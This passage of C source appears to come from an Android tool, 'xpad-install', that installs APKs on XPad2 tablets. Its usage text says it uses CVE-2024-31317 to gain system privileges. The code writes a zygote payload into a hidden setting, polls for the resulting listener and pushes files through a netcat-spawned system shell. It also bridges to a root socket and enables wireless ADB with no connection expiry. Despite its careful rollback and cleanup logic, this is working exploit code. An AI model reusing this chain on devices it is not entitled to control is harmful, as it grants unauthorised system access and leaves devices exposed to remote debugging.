  }
  if (incident_open() != 0) {
    fprintf(stderr, "xpad-install: cannot create durable 31317 incident log\n");
    return 77;
  }
  incident_event("transaction-begin", 0, "running");

  int existing = connect_tcp(ZYGOTE_PORT);
  if (existing >= 0) {
    close(existing);
    int restored = restore_persisted_hidden_setting();
    if (restored < 0) {
      remove_recognized_payload();
      trip_circuit_breaker();
      incident_event("existing-listener", 0, "restore-failed");
      cleanup_system_runner();
      incident_close();
      return 75;
    }
    incident_event("existing-listener", 0,
                   restored == 0 ? "setting-restored" : "reused");
    if (incident_core_check("existing-listener-core-check", 0) == 75) {
      cleanup_system_runner();
      incident_close();
      return 75;
    }
    return 0;
  }
  if (capture_hidden_guard() != 0) {
    incident_event("hidden-setting-capture", 0, "failed");
    incident_close();
    return 77;
  }
  incident_event("hidden-setting-capture", 0,
                 hidden_guard.original_missing ? "missing" : "present");
  if (incident_core_check("capture-core-check", 0) == 75)
    return abort_31317_acquire("transaction-abort", 0, 75);

  char *payload = build_zygote_payload();
  if (!payload) return abort_31317_acquire("payload-build", 0, 77);
  for (int attempt = 1; attempt <= 3; attempt++) {
    if (apply_hidden_guard(&hidden_guard) != 0) {
      free(payload);
      return abort_31317_acquire("attempt-restore", attempt, 75);
    }
    incident_event("attempt-begin", attempt, "running");
    if (incident_core_check("attempt-begin-core-check", attempt) == 75) {
      free(payload);
      return abort_31317_acquire("transaction-abort", attempt, 75);
    }
    force_stop_package(PRIMARY_TRIGGER_PACKAGE);
    force_stop_package(SECONDARY_TRIGGER_PACKAGE);
    incident_event("alignment-force-stop", attempt, "complete");
    if (incident_core_check("force-stop-core-check", attempt) == 75) {
      free(payload);
      return abort_31317_acquire("transaction-abort", attempt, 75);
    }
    if (settings_put_verified(payload) != 0) {
      incident_event("payload-write", attempt, "failed");
      free(payload);
      return abort_31317_acquire("transaction-abort", attempt, 77);
    }
    incident_event("payload-write", attempt, "verified");
    if (incident_core_check("payload-core-check", attempt) == 75) {
      free(payload);
      return abort_31317_acquire("transaction-abort", attempt, 75);
    }
    start_alignment_triggers();
    incident_event("alignment-triggers", attempt, "complete");
    if (incident_core_check("trigger-core-check", attempt) == 75) {
      free(payload);
      return abort_31317_acquire("transaction-abort", attempt, 75);
    }
    for (int i = 0; i < 12; i++) {
      if (incident_core_check("listener-poll-core-check", attempt) == 75) {
        free(payload);
        return abort_31317_acquire("transaction-abort", attempt, 75);
      }
      int fd = connect_tcp(ZYGOTE_PORT);
      if (fd >= 0) {
        close(fd);
        incident_event("listener-ready", attempt, "connected");
        if (finish_hidden_guard() != 0) {
          incident_event("hidden-setting-restore", attempt, "failed");
          remove_recognized_payload();
          trip_circuit_breaker();
          cleanup_system_runner();
          free(payload);
          incident_close();
          fprintf(stderr,
                  "xpad-install: exact hidden setting restore failed; ordinary reboot required\n");
          return 75;
        }
        incident_event("hidden-setting-restore", attempt, "restored");
        force_stop_package(PRIMARY_TRIGGER_PACKAGE);
        force_stop_package(SECONDARY_TRIGGER_PACKAGE);
        free(payload);
        if (incident_core_check("listener-ready-core-check", attempt) == 75) {
          cleanup_system_runner();
          incident_close();
          return 75;
        }
        return 0;
      }
      sleep(1);
    }
    fprintf(stderr, "xpad-install: 31317 attempt %d failed\n", attempt);
    incident_event("attempt-end", attempt, "listener-missing");
    if (apply_hidden_guard(&hidden_guard) != 0) {
      free(payload);
      return abort_31317_acquire("attempt-restore", attempt, 75);
    }
    incident_event("hidden-setting-restore", attempt, "restored");
    if (incident_core_check("attempt-end-core-check", attempt) == 75) {
      free(payload);
      return abort_31317_acquire("transaction-abort", attempt, 75);
    }
  }
  free(payload);
  return abort_31317_acquire("transaction-exhausted", 3, 77);
}

static int finish_31317_transaction(const char *stage, int rc) {
  incident_event(stage, 0, rc == 0 ? "complete" : "failed");
  cleanup_system_runner();
  int restore_rc = restore_persisted_hidden_setting();
  if (restore_rc < 0) {
    remove_recognized_payload();
    trip_circuit_breaker();
    rc = 75;
    incident_event("final-hidden-setting-restore", 0, "failed");
  } else if (restore_rc == 0) {
    incident_event("final-hidden-setting-restore", 0, "restored");
  }
  if (incident_core_check("transaction-final-core-check", 0) == 75) rc = 75;
  incident_event("transaction-end", 0,
                 rc == 75 ? "reboot-required" : rc == 0 ? "succeeded" : "failed");
  incident_close();
  return rc;
}

static int transfer_dex_to_system(void) {
  char command[1024];
  snprintf(command, sizeof(command),
           "P=%s; export P; mkdir -p \"${P%%/*}\"; rm -f \"$P\" \"$P.pid\"; "
           "toybox nc -s 127.0.0.1 -p %d -L /system/bin/sh -c 'cat > \"$P\"' & echo $! > \"$P.pid\"",
           SYSTEM_DEX, TRANSFER_PORT);
  if (rpc(command, 10) != 0) return -1;
  int fd = -1;
  for (int i = 0; i < 30 && fd < 0; i++) { usleep(100000); fd = connect_tcp(TRANSFER_PORT); }
  if (fd < 0) return -1;
  size_t size = (size_t)(xpad_dex_end - xpad_dex_start);
  int rc = write_all(fd, xpad_dex_start, size);
  shutdown(fd, SHUT_WR); close(fd); usleep(500000);
  snprintf(command, sizeof(command),
           "kill $(cat %s.pid) 2>/dev/null; rm -f %s.pid; test $(stat -c %%s %s) -eq %zu",
           SYSTEM_DEX, SYSTEM_DEX, SYSTEM_DEX, size);
  return rc == 0 && rpc(command, 10) == 0 ? 0 : -1;
}

static int transfer_apk_to_system(const char *local_path) {
  int input = open(local_path, O_RDONLY | O_CLOEXEC);
  if (input < 0) return -1;
  char command[1024];
  snprintf(command, sizeof(command),
           "P=%s; export P; mkdir -p \"${P%%/*}\"; rm -f \"$P\" \"$P.pid\"; "
           "toybox nc -s 127.0.0.1 -p %d -L /system/bin/sh -c 'cat > \"$P\"' & echo $! > \"$P.pid\"",
           SYSTEM_APK, TRANSFER_PORT);
  if (rpc(command, 10) != 0) { close(input); return -1; }
  int fd = -1;
  for (int i = 0; i < 30 && fd < 0; i++) { usleep(100000); fd = connect_tcp(TRANSFER_PORT); }
  if (fd < 0) { close(input); return -1; }
  char buffer[65536];
  off_t total = 0;
  int rc = 0;
  for (;;) {
    ssize_t n = read(input, buffer, sizeof(buffer));
    if (n < 0 && errno == EINTR) continue;
    if (n < 0) { rc = -1; break; }
    if (n == 0) break;
    if (write_all(fd, buffer, (size_t)n) != 0) { rc = -1; break; }
    total += n;
  }
  close(input); shutdown(fd, SHUT_WR); close(fd); usleep(500000);
  snprintf(command, sizeof(command),
           "kill $(cat %s.pid) 2>/dev/null; rm -f %s.pid; test $(stat -c %%s %s) -eq %lld",
           SYSTEM_APK, SYSTEM_APK, SYSTEM_APK, (long long)total);
  return rc == 0 && rpc(command, 10) == 0 ? 0 : -1;
}

static int exec_java(const char *dex_path, int argc, char **argv) {
  char cp[512], dexenv[512];
  snprintf(cp, sizeof(cp), "CLASSPATH=%s:/system/app/pad2_znxxservice/pad2_znxxservice.apk", dex_path);
  snprintf(dexenv, sizeof(dexenv), "XPAD_EMBEDDED_DEX=%s", dex_path);
  setenv("CLASSPATH", cp + strlen("CLASSPATH="), 1);
  setenv("XPAD_EMBEDDED_DEX", dexenv + strlen("XPAD_EMBEDDED_DEX="), 1);
  char **child = calloc((size_t)argc + 4, sizeof(char *));
  if (!child) return 70;
  int n = 0;
  child[n++] = "/system/bin/app_process"; child[n++] = "/"; child[n++] = "XpadInstaller";
  for (int i = 0; i < argc; i++) child[n++] = argv[i];
  child[n] = NULL;
  execv(child[0], child);
  return 70;
}

static int run_embedded_java(int argc, char **argv) {
  if (write_file(ROOT_DEX, xpad_dex_start,
                 (size_t)(xpad_dex_end - xpad_dex_start), 0444) != 0) return 74;
  pid_t pid = fork();
  if (pid < 0) {
    unlink(ROOT_DEX);
    return 70;
  }
  if (pid == 0) _exit(exec_java(ROOT_DEX, argc, argv));
  int rc = wait_command(pid);
  unlink(ROOT_DEX);
  return rc;
}

static int configure_autostart(void) {
  char *const grant[] = {
    "/system/bin/pm", "grant", "com.yoyicue.boominstaller",
    "android.permission.WRITE_SECURE_SETTINGS", NULL
  };
  if (run_command(grant) != 0) {
    fprintf(stderr, "xpad-install: cannot grant BoomInstaller WRITE_SECURE_SETTINGS\n");
    return 77;
  }
  char *const adb_enabled[] = {
    "/system/bin/settings", "put", "global", "adb_enabled", "1", NULL
  };
  char *const wifi_enabled[] = {
    "/system/bin/settings", "put", "global", "adb_wifi_enabled", "1", NULL
  };
  char *const no_expiry[] = {
    "/system/bin/settings", "put", "global", "adb_allowed_connection_time", "0", NULL
  };
  if (run_command(adb_enabled) != 0 || run_command(wifi_enabled) != 0
      || run_command(no_expiry) != 0) {
    fprintf(stderr, "xpad-install: cannot configure wireless ADB for auto-start\n");
    return 77;
  }
  char *args[] = {"autostart", "enable"};
  int rc = run_embedded_java(2, args);
  if (rc != 0) {
    fprintf(stderr, "xpad-install: BoomInstaller auto-start setup failed\n");
    return rc;
  }
  /* AdbDebuggingManager tears the pairing server down asynchronously. */
  sleep(15);
  char *const wifi_disabled[] = {
    "/system/bin/settings", "put", "global", "adb_wifi_enabled", "0", NULL
  };
  if (run_command(wifi_disabled) != 0) {
    fprintf(stderr, "xpad-install: cannot restart wireless ADB after pairing\n");
    return 77;
  }
  sleep(2);
  if (run_command(wifi_enabled) != 0) {
    fprintf(stderr, "xpad-install: cannot restart wireless ADB after pairing\n");
    return 77;
  }
  puts("autostart=enabled");
  return 0;
}

static int run_java_as_znxrun(int argc, char **argv) {
  char *const probe[] = {"/system/bin/run-as", "znxrun", "/system/bin/true", NULL};
  if (run_command(probe) != 0) return -1;
  int apk_index = argc >= 2 &&
      (!strcmp(argv[0], "install") || !strcmp(argv[0], "upgrade")) ? argc - 1 : -1;
  char **effective_argv = argv;
  if (apk_index >= 0) {
    if (copy_file(argv[apk_index], ZNXRUN_APK, 0444) != 0) return 74;
    effective_argv = calloc((size_t)argc, sizeof(char *));
    if (!effective_argv) {
      unlink(ZNXRUN_APK);
      return 70;
    }
    for (int i = 0; i < argc; i++) effective_argv[i] = argv[i];
    effective_argv[apk_index] = ZNXRUN_APK;
  }
  if (write_file(ROOT_DEX, xpad_dex_start,
                 (size_t)(xpad_dex_end - xpad_dex_start), 0444) != 0) {
    free(effective_argv == argv ? NULL : effective_argv);
    unlink(ZNXRUN_APK);
    return 74;
  }

  char command[16384];
  int used = snprintf(command, sizeof(command),
      "CLASSPATH=" ROOT_DEX ":/system/app/pad2_znxxservice/pad2_znxxservice.apk "
      "XPAD_EMBEDDED_DEX=" ROOT_DEX " XPAD_TRANSPORT=0044 "
      "/system/bin/app_process / XpadInstaller");
  if (used < 0 || (size_t)used >= sizeof(command)) {
    unlink(ROOT_DEX);
    unlink(ZNXRUN_APK);
    free(effective_argv == argv ? NULL : effective_argv);
    return 64;
  }
  for (int i = 0; i < argc; i++) {
    char quoted[4096];
    shell_quote(quoted, sizeof(quoted), effective_argv[i]);
    size_t need = 1 + strlen(quoted);
    if ((size_t)used + need >= sizeof(command)) {
      unlink(ROOT_DEX);
      unlink(ZNXRUN_APK);
      free(effective_argv == argv ? NULL : effective_argv);
      return 64;
    }
    command[used++] = ' ';
    memcpy(command + used, quoted, strlen(quoted) + 1);
    used += (int)strlen(quoted);
  }

  char *const child[] = {
    "/system/bin/run-as", "znxrun", "/system/bin/sh", "-c", command, NULL
  };
  int rc = run_command(child);
  unlink(ROOT_DEX);
  unlink(ZNXRUN_APK);
  free(effective_argv == argv ? NULL : effective_argv);
  return rc;
}

static int apk_arg_index(int argc, char **argv) {
  if (argc >= 2 && (!strcmp(argv[0], "install") || !strcmp(argv[0], "upgrade")))
    return argc - 1;
  if (argc >= 4 && !strcmp(argv[0], "znxrun") &&
      (!strcmp(argv[1], "create") || !strcmp(argv[1], "ensure"))) {
    for (int i = 2; i + 1 < argc; i++) if (!strcmp(argv[i], "--apk")) return i + 1;
  }
  return -1;
}

static int parse_service_args(int argc, char **argv, const char **starter, const char **apk) {
  *starter = NULL;
  *apk = NULL;
  for (int i = 1; i < argc; i++) {
    if (!strncmp(argv[i], "--starter=", 10)) {
      *starter = argv[i] + 10;
    } else if (!strncmp(argv[i], "--apk=", 6)) {
      *apk = argv[i] + 6;
    } else {
      fprintf(stderr, "xpad-install: unknown service argument: %s\n", argv[i]);
      return 64;
    }
  }
  if (!*starter || !**starter || !*apk || !**apk) {
    fprintf(stderr, "xpad-install: activate requires --starter=PATH and --apk=PATH\n");
    return 64;
  }
  struct stat st;
  if (stat(*starter, &st) != 0 || !S_ISREG(st.st_mode) || access(*starter, R_OK | X_OK) != 0) {
    fprintf(stderr, "xpad-install: starter is not executable: %s\n", *starter);
    return 66;
  }
  if (stat(*apk, &st) != 0 || !S_ISREG(st.st_mode) || access(*apk, R_OK) != 0) {
    fprintf(stderr, "xpad-install: manager APK is not readable: %s\n", *apk);
    return 66;
  }
  return 0;
}

static int serve(int argc, char **argv) {
  const char *starter, *apk;
  int rc = parse_service_args(argc, argv, &starter, &apk);
  if (rc != 0) return rc;
  uid_t uid = getuid();
  if (uid != 0 && uid != 2000) {
    fprintf(stderr, "xpad-install: serve requires root or adb shell (current uid=%d)\n", uid);
    return 77;
  }
  char apk_arg[2048];
  if (snprintf(apk_arg, sizeof(apk_arg), "--apk=%s", apk) >= (int)sizeof(apk_arg)) return 64;
  char *const child[] = {(char *)starter, apk_arg, NULL};
  execv(starter, child);
  fprintf(stderr, "xpad-install: cannot execute starter %s: %s\n", starter, strerror(errno));
  return 126;
}

static int ionstack_root_java(int argc, char **argv) {
  if (getuid() != 0) return 77;
  FILE *enforce = fopen("/sys/fs/selinux/enforce", "r");
  int enforcing = enforce ? fgetc(enforce) == '1' : 1;
  if (enforce) fclose(enforce);
  if (enforcing) {
    fprintf(stderr, "xpad-install: IonStack root transport requires SELinux disabled\n");
    return 77;
  }
  if (write_file(ROOT_DEX, xpad_dex_start, (size_t)(xpad_dex_end - xpad_dex_start), 0444) != 0)
    return 74;
  int apk_index = apk_arg_index(argc, argv);
  int has_apk = apk_index >= 0;
  char **args = argv;
  if (has_apk) {
    if (!strcmp(argv[0], "install") || !strcmp(argv[0], "upgrade"))
      setenv("XPAD_PROVIDER_APK", argv[apk_index], 1);
    if (copy_file(argv[apk_index], "/data/local/tmp/.xpad-installer.apk", 0444) != 0) return 74;
    args = calloc((size_t)argc + 1, sizeof(char *));
    if (!args) return 70;
    for (int i = 0; i < argc; i++) args[i] = argv[i];
    args[apk_index] = "/data/local/tmp/.xpad-installer.apk";
  }
  setenv("XPAD_TRANSPORT", "ionstack-root", 1);
  if (setgid(1000) != 0 || setuid(1000) != 0) return 77;
  return exec_java(ROOT_DEX, argc, args);
}

static int ionstack_delegate(int argc, char **argv) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) return -1;
  struct sockaddr_un addr; memset(&addr, 0, sizeof(addr)); addr.sun_family = AF_UNIX;
  snprintf(addr.sun_path, sizeof(addr.sun_path), "%s", SU_SOCKET);
  if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) { close(fd); return -1; }
  char command[8192] = {0}, quoted[2048];
  shell_quote(quoted, sizeof(quoted), argv[0]);
  snprintf(command, sizeof(command), "%s --root-child", quoted);
  for (int i = 1; i < argc; i++) {
    shell_quote(quoted, sizeof(quoted), argv[i]);
    strlcat(command, " ", sizeof(command)); strlcat(command, quoted, sizeof(command));
  }
  strlcat(command,
          "; RC=$?; rm -f /data/local/tmp/.xpad-installer.dex /data/local/tmp/.xpad-installer.apk; "
          "echo __XPAD_IONSTACK_RC__$RC; exit $RC",
          sizeof(command));
  char mode = 'C'; uint32_t len = (uint32_t)strlen(command);
  write_all(fd, &mode, 1); write_all(fd, &len, sizeof(len)); write_all(fd, command, len);
  shutdown(fd, SHUT_WR);
  char buffer[4096], tail[256] = {0};
  for (;;) {
    ssize_t n = read(fd, buffer, sizeof(buffer));
    if (n <= 0) break;
    write_all(1, buffer, (size_t)n);
    size_t keep = (size_t)n < sizeof(tail) - 1 ? (size_t)n : sizeof(tail) - 1;
    memcpy(tail, buffer + n - keep, keep); tail[keep] = 0;
  }
  close(fd);
  char *marker = strstr(tail, "__XPAD_IONSTACK_RC__");
  return marker ? atoi(marker + strlen("__XPAD_IONSTACK_RC__")) : 125;
}

static int native_self_test(void) {
  size_t dex_size = (size_t)(xpad_dex_end - xpad_dex_start);
  size_t anchor_size = (size_t)(xpad_anchor_end - xpad_anchor_start);
  uid_t parsed_10070 = 0, parsed_10072 = 0, rejected = 0;
  int uid_parser_valid =
      parse_package_uid("package:" OEM_INSTALLER " uid:10070\n",
                        OEM_INSTALLER, &parsed_10070) == 0 &&
      parsed_10070 == 10070 &&
      parse_package_uid("package:" OEM_INSTALLER " uid:10072\n",
                        OEM_INSTALLER, &parsed_10072) == 0 &&
      parsed_10072 == 10072 &&
      parse_package_uid("package:" OEM_INSTALLER ".other uid:10070\n",
                        OEM_INSTALLER, &rejected) != 0;
  int valid = dex_size >= 8 && !memcmp(xpad_dex_start, "dex\n", 4) &&
      anchor_size >= 4 && !memcmp(xpad_anchor_start, "PK\003\004", 4) &&
      uid_parser_valid;
  printf("XPAD_INSTALL_SELF_TEST status=%s version=%s dex_size=%zu anchor_size=%zu\n",
         valid ? "ok" : "failed", XPAD_INSTALL_VERSION, dex_size, anchor_size);
  return valid ? 0 : 1;
}

static int native_doctor(void) {
  int self_test = native_self_test();
  char context[256] = "unavailable";
  int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t count = read(fd, context, sizeof(context) - 1);
    close(fd);
    if (count > 0) {
      context[count] = 0;
      trim_output(context);
    }
  }
  printf("uid=%d\n", getuid());
  puts("transport=none");
  printf("selinux=%s\n", context);
  printf("provider=%s\n",
         access("/system/app/pad2_znxxservice/pad2_znxxservice.apk", R_OK) == 0
             ? "available" : "missing");
  znxrun_status(1);
  puts("31317=not-probed");
  return self_test;
}

static const char *dump_value(const char *dump, const char *name,
                              char *value, size_t capacity) {
  const char *found = strstr(dump, name);
  if (!found) return NULL;
  found += strlen(name);
  size_t used = 0;
  while (found[used] && found[used] != '\n' && found[used] != '\r' &&
         found[used] != ' ' && found[used] != '\t' && used + 1 < capacity) {
    value[used] = found[used];
    used++;
  }
  value[used] = 0;
  return value;
}

static int native_verify(int argc, char **argv) {
  if (argc < 3 || argc > 4) {
    fprintf(stderr, "xpad-install: verify requires PACKAGE [VERSION_CODE]\n");
    return 64;
  }
  long long minimum = 0;
  if (argc == 4) {
    char *end = NULL;
    errno = 0;
    minimum = strtoll(argv[3], &end, 10);
    if (errno || !end || *end || minimum < 0) {
      fprintf(stderr, "xpad-install: invalid VERSION_CODE: %s\n", argv[3]);
      return 64;
    }
  }
  char *dump = NULL;
  char *const command[] = {
    "/system/bin/dumpsys", "package", argv[2], NULL
  };
  int command_rc = capture_command(command, &dump);
  char marker[512];
  snprintf(marker, sizeof(marker), "Package [%s]", argv[2]);
  if (command_rc != 0 || !dump || !strstr(dump, marker)) {
    printf("[-] package missing: %s\n", argv[2]);
    free(dump);
    return 1;
  }
  char version_text[64], installer[256];
  const char *package_dump = strstr(dump, marker);
  const char *version = dump_value(package_dump, "versionCode=", version_text,
                                   sizeof(version_text));
  const char *source = dump_value(package_dump, "installerPackageName=", installer,
                                  sizeof(installer));
  char *end = NULL;
  errno = 0;
  long long actual = version ? strtoll(version, &end, 10) : -1;
  int version_valid = version && !errno && end && end != version &&
      (*end == 0 || *end == ' ');
  printf("package=%s\n", argv[2]);
  printf("versionCode=%lld\n", version_valid ? actual : -1);
  printf("installer=%s\n", source && *source ? source : "null");
  free(dump);
  return version_valid && actual >= minimum && source &&
      !strcmp(source, OEM_INSTALLER) ? 0 : 1;
}

static int native_cleanup(void) {
  int needs_reboot = circuit_breaker_active();
  int restored = restore_persisted_hidden_setting();
  if (restored < 0) {
    fprintf(stderr,
            "xpad-install: saved hidden setting could not be restored exactly\n");
    remove_recognized_payload();
    needs_reboot = 1;
  } else if (restored == 0) {
    puts("hidden-setting=restored");
  } else {
    int removed = remove_recognized_payload();
    if (removed < 0) {
      needs_reboot = 1;
    } else if (removed == 0) {
      puts("hidden-setting=removed-stale-payload");
    }
  }

  int listener = connect_tcp(ZYGOTE_PORT);
  if (listener >= 0) {
    close(listener);
    cleanup_system_runner();
  }
  listener = connect_tcp(ZYGOTE_PORT);
  if (listener >= 0) {
    close(listener);
    fprintf(stderr, "xpad-install: temporary system runner is still reachable\n");
    needs_reboot = 1;
  }
  unlink(ROOT_DEX);
  unlink(ZNXRUN_APK);
  unlink(ANCHOR_APK);
  unlink("/data/local/tmp/.xpad-installer.apk");
  puts(needs_reboot ? "cleanup=reboot-required" : "cleanup=complete");
  return needs_reboot ? 75 : 0;
}

static void usage(FILE *out) {
  fprintf(out,
      "xpad-install - single-file OEM APK installer for authorized XPad2 devices\n"
      "\n"
      "Usage:\n"
      "  xpad-install --version\n"
      "  xpad-install self-test\n"
      "  xpad-install doctor\n"
      "  xpad-install install [--backend auto|provider|direct] APK\n"
      "  xpad-install upgrade [--backend auto|provider|direct] APK\n"
      "  xpad-install verify PACKAGE [VERSION_CODE]\n"
      "  xpad-install activate --starter=PATH --apk=MANAGER.apk\n"
      "  xpad-install autostart enable\n"
      "  xpad-install znxrun status\n"
      "  xpad-install znxrun ensure\n"
      "  xpad-install znxrun preflight\n"
      "  xpad-install znxrun create --package PACKAGE --apk UPDATE.apk [--apply]\n"
      "  xpad-install cleanup\n"
      "  xpad-install -h | --help\n"
      "\n"
      "APK placement:\n"
      "  Put APKs under /sdcard/Download so the znxxservice Provider can read them.\n"
      "\n"
      "APK installation identity:\n"
      "  0044 run-as znxrun (uid matches the device's OEM installer) for every APK operation\n"
      "  CVE-2024-31317 is used only to repair a missing/broken 0044 identity\n"
      "\n"
      "Backends:\n"
      "  auto      Prefer the OEM znxxservice Provider inside the 0044 identity.\n"
      "  provider  Ask the real znxxservice identity to install the APK. Recommended.\n"
      "  direct    Create a PackageInstaller session inside the 0044 identity.\n"
      "\n"
      "Examples:\n"
      "  adb push app.apk /sdcard/Download/app.apk\n"
      "  adb shell /data/local/tmp/xpad-install doctor\n"
      "  adb shell /data/local/tmp/xpad-install install /sdcard/Download/app.apk\n"
      "  adb shell /data/local/tmp/xpad-install verify com.example.app\n"
      "  adb shell /data/local/tmp/xpad-install autostart enable\n"
      "  adb shell /data/local/tmp/xpad-install znxrun status\n"
      "  adb shell /data/local/tmp/xpad-install znxrun ensure\n"
      "  adb shell /data/local/tmp/xpad-install znxrun preflight\n"
      "\n"
      "The tool restores hidden_api_blacklist_exemptions and removes temporary\n"
      "listeners/files after the 31317 transport exits. Root is not persistent.\n");
}

static int system_transport(int argc, char **argv) {
  int acquire_rc = acquire_31317();
  if (acquire_rc != 0) return acquire_rc == 75 ? 75 : 77;
  int rc = 74;
  if (transfer_dex_to_system() != 0) {
    incident_event("transfer-dex", 0, "failed");
    goto cleanup;
  }
  incident_event("transfer-dex", 0, "complete");
  if (incident_core_check("transfer-dex-core-check", 0) == 75) {
    rc = 75;
    goto cleanup;
  }
  int apk_index = apk_arg_index(argc - 1, argv + 1);
  int has_apk = apk_index >= 0;
  int native_apk_index = has_apk ? apk_index + 1 : -1;
  const char *provider_apk = has_apk ? argv[native_apk_index] : NULL;
  if (has_apk && transfer_apk_to_system(provider_apk) != 0) {
    incident_event("transfer-apk", 0, "failed");
    goto cleanup;
  }
  if (has_apk) {
    incident_event("transfer-apk", 0, "complete");
    if (incident_core_check("transfer-apk-core-check", 0) == 75) {
      rc = 75;
      goto cleanup;
    }
  }
  char command[16384], quoted[2048];
  snprintf(command, sizeof(command),
           "CLASSPATH=%s:/system/app/pad2_znxxservice/pad2_znxxservice.apk "
           "XPAD_EMBEDDED_DEX=%s XPAD_TRANSPORT=31317",
           SYSTEM_DEX, SYSTEM_DEX);
  if (has_apk && (!strcmp(argv[1], "install") || !strcmp(argv[1], "upgrade"))) {
    shell_quote(quoted, sizeof(quoted), provider_apk);
    strlcat(command, " XPAD_PROVIDER_APK=", sizeof(command));
    strlcat(command, quoted, sizeof(command));
  }
  strlcat(command, " /system/bin/app_process / XpadInstaller", sizeof(command));
  for (int i = 1; i < argc; i++) {
    shell_quote(quoted, sizeof(quoted), has_apk && i == native_apk_index ? SYSTEM_APK : argv[i]);
    strlcat(command, " ", sizeof(command)); strlcat(command, quoted, sizeof(command));
  }
  rc = rpc(command, 300);
  incident_event("java-command", 0, rc == 0 ? "complete" : "failed");
  if (incident_core_check("java-command-core-check", 0) == 75) rc = 75;

cleanup:
  rpc("for F in " SYSTEM_DEX ".pid " SYSTEM_APK ".pid; do "
      "[ -f \"$F\" ] && kill $(cat \"$F\") 2>/dev/null; done; "
      "rm -f " SYSTEM_DEX " " SYSTEM_APK " " SYSTEM_DEX ".pid " SYSTEM_APK ".pid", 10);
  rc = finish_31317_transaction("system-transport-complete", rc);
  if (rc == 75) return rc;
  int verify_znxrun = argc >= 4 && !strcmp(argv[1], "znxrun") &&
      (!strcmp(argv[2], "create") || !strcmp(argv[2], "ensure"));
  for (int i = 3; verify_znxrun && i < argc; i++)
    if (!strcmp(argv[i], "--apply")) {
      if (rc == 0 && wait_znxrun_healthy(301, 1000000) != 0) {
        fprintf(stderr,
                "xpad-install: 0044 commit returned success but bounded health verification timed out\n");
        puts("repair_committed=true");
        return ZNXRUN_ENSURE_PENDING;
      }
      break;
    }
  return rc;
}

static const char *option_value(int argc, char **argv, const char *name) {
  for (int i = 1; i + 1 < argc; i++)
    if (!strcmp(argv[i], name)) return argv[i + 1];
  return NULL;
}

static int run_znxrun_mutation(int argc, char **argv, const char *package_name) {
  if (getuid() != 2000) {
    fprintf(stderr, "xpad-install: znxrun persistence maintenance requires adb shell uid 2000\n");
    return 77;
  }
  struct whitelist_guard guard;
  int rc = prepare_whitelist(package_name, &guard);
  if (rc != 0) {
    restore_whitelist(&guard);
    return rc;
  }
  pid_t child = fork();
  if (child < 0) {
    restore_whitelist(&guard);
    return 70;
  }
  if (child == 0) _exit(system_transport(argc, argv));

  struct sigaction action, old_hup, old_int, old_term;
  memset(&action, 0, sizeof(action));
  action.sa_handler = forward_guarded_signal;
  sigemptyset(&action.sa_mask);
  guarded_child = child;
  sigaction(SIGHUP, &action, &old_hup);
  sigaction(SIGINT, &action, &old_int);
  sigaction(SIGTERM, &action, &old_term);
  int status = 0;
  while (waitpid(child, &status, 0) < 0) {
    if (errno != EINTR) { status = -1; break; }
  }
  guarded_child = -1;
  sigaction(SIGHUP, &old_hup, NULL);
  sigaction(SIGINT, &old_int, NULL);
  sigaction(SIGTERM, &old_term, NULL);
  if (status < 0) rc = 127;
  else if (WIFEXITED(status)) rc = WEXITSTATUS(status);
  else rc = 128 + WTERMSIG(status);
  if (rc >= 128) {
    cleanup_system_runner();
    int setting_rc = restore_persisted_hidden_setting();
    if (setting_rc < 0) rc = 75;
    force_stop_package(PRIMARY_TRIGGER_PACKAGE);
    force_stop_package(SECONDARY_TRIGGER_PACKAGE);
  }
  int restore_rc = restore_whitelist(&guard);
  if (restore_rc != 0 && rc == 0) rc = restore_rc;
  return rc;
}

static int ensure_znxrun(const char *executable) {
  if (znxrun_status(0) == 0) {
    znxrun_status(1);
    puts("ZNXRUN_ENSURE result=unchanged");
    return 0;
  }
  if (write_file(ANCHOR_APK, xpad_anchor_start,
                 (size_t)(xpad_anchor_end - xpad_anchor_start), 0600) != 0) {
    fprintf(stderr, "xpad-install: cannot stage embedded installer anchor\n");
    return 74;
  }
  char *ensure_argv[] = {
    (char *)executable, "znxrun", "ensure", "--apk", ANCHOR_APK, "--apply", NULL
  };
  int rc = run_znxrun_mutation(6, ensure_argv, ANCHOR_PACKAGE);
  unlink(ANCHOR_APK);
  int status_rc = znxrun_status(1);
  if (rc == ZNXRUN_ENSURE_PENDING && status_rc == 0) rc = 0;
  if (rc == 0 && status_rc != 0) rc = 1;
  printf("ZNXRUN_ENSURE result=%s\n",
         rc == 0 ? "repaired" :
         rc == ZNXRUN_ENSURE_PENDING ? "pending" : "failed");
  return rc;
}

static int finalize_apk_persistence(const char *executable, int rc,
                                    const char *transport) {
  if (rc != 0 || getuid() != 2000) return rc;
  if (znxrun_status(0) == 0) return 0;
  fprintf(stderr,
          "xpad-install: %s APK commit degraded 0044 persistence; repairing\n",
          transport);
  int repair = ensure_znxrun(executable);
  if (repair == ZNXRUN_ENSURE_PENDING) {
    puts("target_apk_installed=true");
    fprintf(stderr,
            "xpad-install: APK installed; managed 0044 repair is still pending\n");
    return repair;
  }
  if (repair != 0) {
    fprintf(stderr,
            "xpad-install: APK installed but managed 0044 repair failed\n");
    return 1;
  }
  return 0;
}

static int parse_apk_operation(int argc, char **argv, const char **backend) {
  if (argc != 3 && argc != 5) {
    fprintf(stderr,
            "xpad-install: install/upgrade requires [--backend auto|provider|direct] APK\n");
    return 64;
  }
  *backend = "auto";
  if (argc == 5) {
    if (strcmp(argv[2], "--backend")) {
      fprintf(stderr, "xpad-install: unknown APK option: %s\n", argv[2]);
      return 64;
    }
    *backend = argv[3];
    if (strcmp(*backend, "auto") && strcmp(*backend, "provider") &&
        strcmp(*backend, "direct")) {
      fprintf(stderr, "xpad-install: invalid backend: %s\n", *backend);
      return 64;
    }
  }
  const char *apk = argv[argc - 1];
  if (!apk || !*apk) {
    fprintf(stderr, "xpad-install: APK path is empty\n");
    return 64;
  }
  return 0;
}

static int install_via_managed_0044(int argc, char **argv) {
  const char *backend = NULL;
  int valid = parse_apk_operation(argc, argv, &backend);
  if (valid != 0) return valid;

  if (znxrun_status(0) != 0) {
    if (getuid() != 2000) {
      fprintf(stderr,
              "xpad-install: managed 0044 is unavailable; repair must run from adb shell\n");
      return 77;
    }
    fprintf(stderr,
            "xpad-install: managed 0044 is unavailable; repairing it before installation\n");
